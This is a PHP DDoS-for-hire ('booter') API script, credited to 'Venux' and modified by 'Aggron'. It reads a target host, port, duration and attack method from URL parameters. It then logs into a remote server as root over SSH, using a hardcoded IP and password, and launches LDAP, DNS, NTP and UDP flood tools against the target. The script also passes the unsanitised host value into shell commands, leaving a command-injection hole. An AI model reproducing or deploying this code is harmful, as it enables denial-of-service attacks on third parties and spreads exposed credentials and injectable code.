<?php
/////////////////////////////////
//--     Venux API Script - Modified by Aggron    --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(0);
//////////////////////////////////////////
//--    You're servers credentials    --//
//-- Enter you're servers credentials --//
//////////////////////////////////////////
$server_ip = "62.171.151.10"; //Change "1337" to your servers IP.
$server_pass = "Kacper123441"; //Change "pass" to your servers password.
$server_user = "root"; //Only change this if your using a user other than root.
 
/////////////////////////////////////////
//-- Gets the value of each variable --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
 
///////////////////////////////////////////////////
//-- array of implemented method as a variable --//
///////////////////////////////////////////////////
$array = array("ldap", "dns", "ntp", "udpbypass", "stop");// Add you're existing methods here, and delete you're none existent methods.
$ray = array("quick");
 
////////////////////////////////////////
//-- Checks if the API key is empty --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
//////////////////////////////////////////
//-- Checks if the API key is correct --//
//////////////////////////////////////////
if (in_array($key, $ray)){ //Change "key" to what ever yo want you're API key to be.
}else{
die('Error: Incorrect API key!');}
 
/////////////////////////////////
//-- Checks if time is empty --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
/////////////////////////////////
//-- Checks if host is empty --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
 
//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////             
if ($time > 3600){
die('Error: Cannot exceed 36000 seconds!');} //Change 10 to the time you used above.
 
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
 
//////////////////////////////////////////////////////////////////////////////
//--                        You're attack methods                         --//
//-- Make sure the command is formatted correctly for each method you add --//
//////////////////////////////////////////////////////////////////////////////
if ($method == "ldap") { $command = "screen -dm perl /root/weed.pl $host $port $time 100"; }
if ($method == "dns") { $command = "screen -dm root/pdns $host $port 5 5 $time"; }
if ($method == "ntp") { $command = "screen -dm perl /root/extraudp.pl $host $port $time"; }
if ($method == "udpbypass") { $command = "screen -dm /root/rawudp $host $port 5 1024 5 $time"; }
if ($method == "stop") { $command = "pkill $host -f"; }
///////////////////////////////////////////////////////
//-- Check to see if the server has SSH2 installed --//
///////////////////////////////////////////////////////
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
///////////////////////////////////////////////////
//-- Attempts to login with you're credentials --//
///////////////////////////////////////////////////
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
////////////////////////////////////////////////////////////////////////////
//-- Tries to execute the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////////////   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
////////////////////////////////////////////////////////////////////
//-- Executed the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method";
            fclose($stream);
        }
    }
}
?>